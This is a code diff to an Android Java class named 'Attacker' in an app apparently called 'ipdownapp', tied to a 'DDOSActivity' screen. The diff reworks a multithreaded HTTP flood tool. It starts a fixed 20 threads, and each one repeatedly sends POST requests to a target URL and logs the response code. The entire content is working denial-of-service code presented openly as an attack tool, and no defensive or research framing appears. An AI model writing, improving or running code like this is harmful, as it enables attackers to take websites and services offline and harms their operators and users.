@@ -1,5 +1,11 @@
 package com.example.ipdownapp.atack_tools;
 
+import android.util.Log;
+
+import androidx.annotation.Nullable;
+
+import com.example.ipdownapp.activitys.DDOSActivity;
+
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
@@ -7,13 +13,14 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 public class Attacker {
 
-    private int num_threads;
+    private int num_threadsDDOS;
 
     public Attacker(String url_request, int num_threads) throws Exception {
-        this.num_threads = num_threads;
-        for (int i = 0; i < num_threads; i++) {
+        //this.num_threads = num_threads;
+        this.num_threadsDDOS = 20;
+        for (int i = 0; i < this.num_threadsDDOS; i++) {
             DdosThread thread = new DdosThread();
-            thread.setRequest(url_request);
+            thread.setRequestURL(url_request);
             thread.start();
         }
     }
@@ -26,12 +33,16 @@ public class Attacker {
 
         String param = null;
 
-        public DdosThread() throws Exception {
-            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
+        public DdosThread(){
         }
 
-        public void setRequest(String request) {
+        public void setRequestURL(String request) {
             this.request = request;
+            try{
+                url = new URL(request);
+                param = "param1=" + URLEncoder.encode("87845", "UTF-8");
+            }catch (Exception e){
+            }
         }
 
         @Override
@@ -45,16 +56,15 @@ public class Attacker {
         }
 
         public void attack() throws Exception {
-            url = new URL(request);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setDoOutput(true);
             connection.setDoInput(true);
             connection.setRequestMethod("POST");
             connection.setRequestProperty("charset", "utf-8");
             connection.setRequestProperty("Content-Length", param);
-            System.out.println(this + " " + connection.getResponseCode());
+            connection.connect();
+            Log.e("THREAD ATACKER:" , ""+connection.getResponseCode());
             connection.getInputStream();
         }
     }
-
 }
